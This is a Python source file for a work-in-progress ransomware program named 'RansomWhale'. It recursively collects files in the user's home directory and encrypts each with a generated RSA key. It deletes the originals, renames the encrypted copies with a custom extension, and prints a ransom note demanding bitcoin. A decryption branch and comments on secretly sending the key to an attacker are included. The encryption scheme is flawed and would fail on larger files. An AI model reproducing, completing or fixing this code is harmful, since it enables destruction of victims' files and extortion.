#### if there is a public.key file, read it, if it works, then decrypt the files
####       it will decrypt the public.key and use it to decrypt the files?
#### start off encrypting, send our key to the attacker somehow, secretly.
#### attacker has seperate program to make his key out of the victim's

### cryptography only lets you encrypt with public keys, so attacker would need to send private to decrypt


#############[Packages]#############
###### cryptography package has our Fernet Symetric Encryption
######  ↳ AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.
######    HMAC using SHA256 for authentication.
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes

import base64
import os
import glob #finds all the pathnames matching a specified pattern
####################################



############[Directory Setup]############
homeDir = os.path.expanduser('~') #grabs user home directory
files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to encrypt   
                                                       #we can switch / for linux to \\ for windows
#########################################


 
############[Targeting Files]############ wip
file_list=[]
important = [] #where we store our key? work in progress
for filename in files:
    if "private_key" in filename:   #was public
        important.append(filename)
        print ("I see you have a private key, let me validate that for you...")
   
    ## vvvvvvvvvvv below used to be an if statement right underneath for loop 
    elif ".pem" not in filename and "ransomPackage" not in filename:    #was just .py, testing, added secret.key, was just .key  #This makes sure we do not accidentally Encrypt our Key and Ransomware
        file_list.append(filename)
#########################################








if len(important) == 0:  #if we dont see a private_key file, we want to encrypt all the files
    ############[Keygen]############
    #vvvvv attackers key:    ##maybe we send this over somehow, or we write our own program that reads in the private_key and makes a public.key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    testPem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    with open("test_key_private.pem",'wb') as testKey:
        testKey.write(testPem)
        testKey.close()


    ######[victims key]######
    public_key = private_key.public_key()

    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    with open('public_key.pem', 'wb') as file:
        file.write(pem)
        file.close()
        #print("key has been generated")
    #########################
    
    
    
    ############[Encrypting Files]############
    print("RansomWhale caught you!")
    for file in file_list:
        fileName = str(file)
        extension = os.path.splitext(file)[1]  #gets extension
    
        with open(file, 'rb') as f:
            f_bytes=f.read()
    
        f_bytes_encrypted = public_key.encrypt(
            f_bytes,
            padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )# used to = fernet.encrypt(f_bytes)
        
        print(f'RansomWhale was hungry and ate your file {file}')
        os.remove(file) #Removes our old unencrypted file
    
        fileExtension = '.RansomWhale.mp4'    #This is just for fun, adds a Custom Extension
        encFile = fileName + fileExtension  #Builds our Encrytped file with it's name + our Custom Extension
    
        with open(encFile, 'wb') as f:      
            f.write(f_bytes_encrypted) # was just f.write(f_bytes_encrypted) Write      #Writes the Encrypted bytes to our Encrypted file.
                                            # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
                                            #added b64encode
            #print(f'heres what i wrote to encfile{f}')
    ##########################################
    ransomNote="""
    Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
    Please send 1btc to [wallet address] along with proof of purchase. 
    to our email workinprogress@gmail.com. Processing could take between 2 - 5 buisness days.
    Thank you for your understanding.
    """
    print(ransomNote)
    
else:     #read the public.key, if it works, then decrypt the files
    print("test")   #ideally, the attacker encrypts the victims key, maybe with fernet, and then sends his key, which is the victims key encrypted by the attacker
                    #we will then decrypt attacker key to get our key back that we sent, and use that to decrpyt our files.
    #test
    ############[Decrypting Files]############
    with open("private_key.pem", "rb") as key_file:
        private_key2 = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )
        
    for file in file_list: #was in important
        with open(file, 'rb') as f:
            f_bytes = f.read()
            
        f_bytes_decrypt = private_key2.decrypt(f_bytes,
                                              padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                           algorithm=hashes.SHA256(),
                                                           label=None)
                                              )
        fileName = str(file).replace('.RansomWhale.mp4','')   #Replaces our Encrypted File's Extension with the file's Original Extensions
        decFile = fileName   #Build our Decrypted file, Filename without the RansomWhale.mp4 extension, possibly unnecessary   
        
        with open(decFile,'wb') as f:
            f.write(f_bytes_decrypt)   #Writes our decrypted bytes to the file with the Original Extensions
            os.remove(file)            #Removes the old encrypted file
            print(f"Successfully decrypted {decFile}, thank you for your purchase.")
    ##########################################